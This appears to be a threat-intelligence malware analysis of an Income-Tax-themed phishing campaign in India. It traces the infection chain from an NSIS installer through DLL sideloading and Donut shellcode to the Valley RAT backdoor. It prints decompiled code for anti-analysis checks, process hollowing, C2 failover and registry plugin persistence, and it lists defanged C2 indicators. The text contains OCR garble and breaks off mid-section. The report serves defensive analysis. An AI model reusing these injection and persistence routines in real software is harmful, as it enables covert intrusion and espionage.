6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: 